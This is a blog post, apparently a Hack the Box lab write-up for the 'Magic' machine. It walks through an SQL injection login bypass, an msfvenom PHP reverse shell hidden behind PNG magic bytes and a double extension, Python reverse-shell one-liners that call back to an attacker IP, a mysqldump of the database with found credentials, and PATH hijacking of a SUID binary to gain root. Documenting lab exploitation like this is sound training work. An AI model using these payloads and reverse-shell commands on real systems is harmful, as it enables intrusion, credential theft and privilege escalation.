<!DOCTYPE html>
<html lang="en" dir=>

<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="This box was really cool for a few reasons. First off we bypass authentication using one of the OWASP Top 10, then continue to upload a reverse shell by tricking the web server into believing we are uploading a .">
<meta name="theme-color" content="#FFFFFF"><meta property="og:title" content="Magic" />
<meta property="og:description" content="This box was really cool for a few reasons. First off we bypass authentication using one of the OWASP Top 10, then continue to upload a reverse shell by tricking the web server into believing we are uploading a ." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://stefantobler.com/posts/hack-the-box/magic/" />
<meta property="article:published_time" content="2020-07-07T00:00:00+00:00" />
<meta property="article:modified_time" content="2020-07-07T00:00:00+00:00" />
<title>Magic | Stefan Tobler</title>
<link rel="manifest" href="/manifest.json">
<link rel="icon" href="/favicon.png" type="image/x-icon">
<link rel="stylesheet" href="/book.min.6cd8553a6854f4812343f0f0c8baca31271e686434f381fbe3c7226f66639176.css" integrity="sha256-bNhVOmhU9IEjQ/DwyLrKMSceaGQ084H748cib2ZjkXY=">
<script defer src="/en.search.min.dc18b94c179a4c3f7f1d0bbc51198f4fa8a2b80c8898f5fc9f9f7bba4d26f98d.js" integrity="sha256-3Bi5TBeaTD9/HQu8URmPT6iiuAyImPX8n597uk0m&#43;Y0="></script>

<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
	ga('create', 'UA-158607018-1', 'auto');
	
	ga('send', 'pageview');
}
</script>
<script async src='https://www.google-analytics.com/analytics.js'></script>
<!--
Made with Book Theme
https://github.com/alex-shpak/hugo-book
-->

  
<link rel="stylesheet" href="/assets/css/posts.css" />

</head>

<body dir=>
  <input type="checkbox" class="hidden toggle" id="menu-control" />
  <input type="checkbox" class="hidden toggle" id="toc-control" />
  <main class="container flex">
    <aside class="book-menu">
      
  <nav>
<h2 class="book-brand">
  <a href="/"><img src="/images/logo.png" alt="Logo" /><span>Stefan Tobler</span>
  </a>
</h2>


<div class="book-search">
  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
  <div class="book-search-spinner hidden"></div>
  <ul id="book-search-results"></ul>
</div>



<span><a href='https://stefantobler.com/posts/'>Recent Posts</a></span>







  



  
  
  
  

  
  <ul>
    
      
        <li>
          
  
    <a href="https://stefantobler.com/categories/hack-the-box">Hack the Box</a>
  

          
  
  
  

  
  <ul>
    
      
        <li>
          
  
    <a href="https://stefantobler.com/categories/challenges">Challenges</a>
  

          
  
  
  

  
  <ul>
    
      
        <li>
          
  
    <a href="/posts/hack-the-box/challenges/fuzzy/" class="">Fuzzy</a>
  

        </li>
      
    
  </ul>
  

        </li>
      
    
      
        <li>
          
  
    <a href="/posts/hack-the-box/archetype/" class="">Archetype</a>
  

        </li>
      
    
      
        <li>
          
  
    <a href="/posts/hack-the-box/magic/" class="active">Magic</a>
  

        </li>
      
    
      
        <li>
          
  
    <a href="/posts/hack-the-box/remote/" class="">Remote</a>
  

        </li>
      
    
      
        <li>
          
  
    <a href="/posts/hack-the-box/traceback/" class="">Traceback</a>
  

        </li>
      
    
      
        <li>
          
  
    <a href="/posts/hack-the-box/admirer/" class="">Admirer</a>
  

        </li>
      
    
  </ul>
  

        </li>
      
    
      
        <li>
          
  
    <a href="https://stefantobler.com/categories/try-hack-me">Try Hack Me</a>
  

          
  
  
  

  
  <ul>
    
      
        <li>
          
  
    <a href="/posts/try-hack-me/basic-pentesting/" class="">Basic Pentesting</a>
  

        </li>
      
    
      
        <li>
          
  
    <a href="/posts/try-hack-me/blue/" class="">Blue</a>
  

        </li>
      
    
      
        <li>
          
  
    <a href="/posts/try-hack-me/ice/" class="">Ice</a>
  

        </li>
      
    
      
        <li>
          
  
    <a href="/posts/try-hack-me/vulnversity/" class="">Vulnversity</a>
  

        </li>
      
    
      
        <li>
          
  
    <a href="/posts/try-hack-me/shodan.io/" class="">Shodan.io</a>
  

        </li>
      
    
  </ul>
  

        </li>
      
    
      
        <li>
          
  
    <a href="https://stefantobler.com/categories/misc">Misc</a>
  

          
  
  
  

  
  <ul>
    
      
        <li>
          
  
    <a href="/posts/misc/docker-containerization-vs-virtualization/" class="">Docker - Containerization vs. Virtualization</a>
  

        </li>
      
    
      
        <li>
          
  
    <a href="/posts/misc/virtualbox-tutorial/" class="">How to Install Kali Linux on VirtualBox</a>
  

        </li>
      
    
  </ul>
  

        </li>
      
    
  </ul>
  















</nav>




  <script>(function(){var menu=document.querySelector("aside.book-menu nav");addEventListener("beforeunload",function(event){localStorage.setItem("menu.scrollTop",menu.scrollTop);});menu.scrollTop=localStorage.getItem("menu.scrollTop");})();</script>


 
    </aside>

    <div class="book-page">
      <header class="book-header">
        
  <div class="flex align-center justify-between">
  <label for="menu-control">
    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
  </label>

  <strong>Magic</strong>

  <label for="toc-control">
    
    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
    
  </label>
</div>


  
  <aside class="hidden clearfix">
    
  <nav id="TableOfContents">
  <ul>
    <li><a href="#tools">Tools</a></li>
    <li><a href="#recon">Recon</a></li>
    <li><a href="#user">User</a></li>
    <li><a href="#root">Root</a></li>
  </ul>
</nav>


  </aside>
  
 
      </header>

      
      

<div class="post-hero-container">
  <img class="card-img-top" src='/images/content/posts/hack-the-box/magic.png'/>
</div>

<article class="markdown">
  <h1>
    <a href="/posts/hack-the-box/magic/">Magic</a>
  </h1>
  
  
  <div>
    
      <a href="/categories/hack-the-box/">hack-the-box</a>
  </div>
  

  
  <div>
    
      <a href="/tags/linux/">linux</a>, 
      <a href="/tags/path-hijacking/">path-hijacking</a>, 
      <a href="/tags/mysql/">mysql</a>, 
      <a href="/tags/magic-bytes/">magic-bytes</a>, 
      <a href="/tags/owasp-top-10/">owasp-top-10</a>
  </div>
  


  <p><p>This box was really cool for a few reasons. First off we bypass authentication using one of the OWASP Top 10, then continue to upload a reverse shell by tricking the web server into believing we are uploading a .png file. This is done through some file manipulation and double extensions. To get user we needed to dump a database and for root we hijacked the command flow. Really fun and challenging!</p>
<h2 id="tools">
  Tools
  <a class="anchor" href="#tools">#</a>
</h2>
<ul>
<li>nmap</li>
<li>ffuf</li>
<li>Burp Suite</li>
<li>msfvenom</li>
<li>python3</li>
<li>mysql</li>
</ul>
<h2 id="recon">
  Recon
  <a class="anchor" href="#recon">#</a>
</h2>
<p>If we do an <code>nmap</code>, <code>sudo nmap -sS -sV magic.htb -oA nmap/magic</code> we can see that there are only two services, SSH and a web server. Now that we know there is a web server I am going to work on enumerating the domain using <code>ffuf</code>. The command I used is <code>ffuf -u http://magic.htb/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .txt,.html,.xml,.php -o ffuf/magic</code> I used some common extensions in hope of finding some interesting files. It looks like most of the stuff running is <code>.php</code>.</p>
<p>My scans did not show up much so I decided to try my hand at the login page. Inspecting the source code did not turn up much however I noticed that I did get the error message when using the character <code>'</code>. This is a sign for SQL injection. However I was not allowed to type spaces in the login box so I opened up Burp Suite and turned intercept on. When submitting the form page I entered my URL encoded payload for the <code>username</code>. My payload was <code>' OR 1=1--</code> then I URL encoded it to <code>%27%20or%201%3D1--</code>. After executing this payload we make it to the upload page. We can create a reverse shell payload. I am going to try and craft a <code>php</code> payload because I know the website will execute <code>php</code>.</p>
<p>Okay so after a few hours of trial and error I figured out that we can craft the payload using this command <code>msfvenom -p php/reverse_php LHOST=10.10.14.2 LPORT=1337 -f raw &gt; shell.php</code>. However we cannot just upload this file because the server requires the file type to be <code>.jpg</code>, <code>.jpeg</code>, or <code>.png</code>. Try changing the file name to <code>shell.png</code>, maybe that will work. Nope they check for that too&hellip; however if we add the <strong>magic</strong> bytes of a <code>.png</code> file to the shell then we can upload it. To add these bytes use the following command <code>printf &quot;�PNG  &quot; | cat - shell.php &gt; shell.png</code>. We can then open up our listener with the command <code>nc -lvnp 1337</code>, then navigate to the file on the website at <code>http://magic.htb/images/uploads/shell.png</code>. If we inspect our listener we notice nothing is happening. Hmm what is going on. Well the web server has no reason to run a <code>.png</code> file. However if we name the file <code>shell.php.png</code> then the webserver will run it and it has the required file extension to pass the upload. Try crafting the payload again with the two extensions. Use the command <code>printf &quot;�PNG  &quot; | cat - shell.php &gt; shell.php.png</code>. Then if we navigate to the image, here <code>http://magic.htb/images/uploads/shell.php.png</code>, we should see something return on our listener. I tried upgrading the shell with <code>python -c 'import pty; pty.spawn(&quot;/bin/sh&quot;)'</code> however nothing happened. I even tried to use <code>python3</code>, then the shell hung. It looks like we are just going to have to use the weakish shell. Oh well.</p>
<h2 id="user">
  User
  <a class="anchor" href="#user">#</a>
</h2>
<p>Now that we are on the server we can begin to investigating the <code>www-data</code> directory. I found a file called <code>db.php5</code>. When I <code>cat</code>ed this file out I found the following information:</p>
<pre><code>private static $dbName = 'Magic' ;
private static $dbHost = 'localhost' ;
private static $dbUsername = 'theseus';
private static $dbUserPassword = 'iamkingtheseus';
</code></pre><p>Let&rsquo;s see if we can use these credentials to <code>ssh</code> into the user <code>theseus</code>. Oops doesn&rsquo;t look like it. But I should be able to use <code>su</code>. If only my reverse shell would stop dying. Doesn&rsquo;t look like <code>su</code> is working either, and I could not get a stable shell to work unfortunately. However I just thought of a way to maybe get a stable reverse shell. I successfully exfiltrated a list of readable files by spawning a simple http server using the command <code>python3 -m http.server</code> in our weak shell. This gave me the idea to maybe spawn another reverse shell. Use the command <code>python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((&quot;10.10.14.2&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'</code> in our weak instance and start to listen on port 1234 on your machine. Of course replace the IP address with your own internal IP. Now we have such a better shell, make sure you upgrade it using <code>python3 -c 'import pty; pty.spawn(&quot;/bin/sh&quot;)'</code>! Now we can see when we try to use the <code>su</code> command that we do not have the correct password. Well maybe there is something else on this machine that will use the password, like maybe the database that it corresponds too. So I was right. I could not find any database on the server, but with the command <code>mysqldump</code> we can use the credentials we found to dump the database because we have all the information we need. If I use the command <code>mysqldump -h localhost -u theseus -p Magic &gt; db_backup.sql</code>, then we have created a plain text dump of the database. In here we find the following credentials:</p>
<pre><code>admin::Th3s3usW4sK1ng
</code></pre><p>Turns out if we do <code>su</code> and use the password we are now the user <code>theseus</code>! What a relief to get user finally. Now onto the big goal.</p>
<h2 id="root">
  Root
  <a class="anchor" href="#root">#</a>
</h2>
<p>Okay so I got <code>linPEAS</code> onto the machine and saw a file named <code>/bin/sysinfo</code>. At first I didn&rsquo;t know what to do because honestly that sounds like something that ships with the machine. However after some more research I found a CVE for it. unfortunately this didn&rsquo;t work because we are missing the <code>.mcsiwrapper</code>. So I continued to enumerate the machine for some time and was fixated for a while on the command <code>/sbin/init</code>. This does ship with the machine and isn&rsquo;t our target. I then ran <code>suid3num</code> which tells us which SUID scripts do not ship with the machine. This brought me back to <code>sysinfo</code> and decided to run <code>strings</code> on it. Turns out it does run escalated privileges, and it also uses a few commands, such as <code>fdisk</code> and <code>lshw</code>. If we were to maybe define our own version of one of these commands maybe we could execute some code as a privileged user. Here is how I crafted my payload.</p>
<pre><code>theseus@ubuntu:~# cd /tmp
theseus@ubuntu:/tmp# touch fdisk
theseus@ubuntu:/tmp# chmod 777 fdisk
theseus@ubuntu:/tmp# export PATH=/tmp:$PATH
theseus@ubuntu:/tmp# echo bash &gt; fdisk
theseus@ubuntu:/tmp# sysinfo
</code></pre><p>Okay so what is going on here? Well first we are moving to the <code>/tmp</code> directory and creating a file named <code>fdisk</code>. This is because we know that <code>sysinfo</code> uses a command called <code>fdisk</code>. Then we change the permissions of <code>fdisk</code> so that it can be executed. Next we need to prioritize the <code>/tmp</code> directory in out <code>PATH</code> so when <code>sysinfo</code> is looking for the location of <code>fdisk</code> it runs into our version first. Finally I echo the command I want to run into the <code>fdisk</code> file and then call <code>sysinfo</code>. Once we run <code>sysinfo</code> we spawn into a shell, but we cannot do anything, so then I created another reverse shell with the command <code>python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((&quot;10.10.14.2&quot;,1235));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);'</code>. I tried placing this command inside my <code>fdisk</code> file, but it would not execute for some reason. But now we are root! Congratulations, my first medium box is complete!</p>
<pre><code>root@ubuntu:~# whoami
root
root@ubuntu:~# id
uid=0(root) gid=0(root) groups=0(root),100(users),1000(theseus)
root@ubuntu:~# ifconfig | grep 10.10.10.185
inet 10.10.10.185  netmask 255.255.255.0  broadcast 10.10.10.255
root@ubuntu:~# hostname
ubuntu
</code></pre></p>
</article>
 
      

      <footer class="book-footer">
        
  <div class="flex flex-wrap justify-between">





</div>

 
        
      </footer>

      
  
  <div class="book-comments">
<div id="disqus_thread"></div>
<script type="application/javascript">
    var disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "stefantobler" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
</div>
  
 

      <label for="menu-control" class="hidden book-menu-overlay"></label>
    </div>

    
    <aside class="book-toc">
      
  <nav id="TableOfContents">
  <ul>
    <li><a href="#tools">Tools</a></li>
    <li><a href="#recon">Recon</a></li>
    <li><a href="#user">User</a></li>
    <li><a href="#root">Root</a></li>
  </ul>
</nav>

 
    </aside>
    
  </main>

  
</body>

</html>












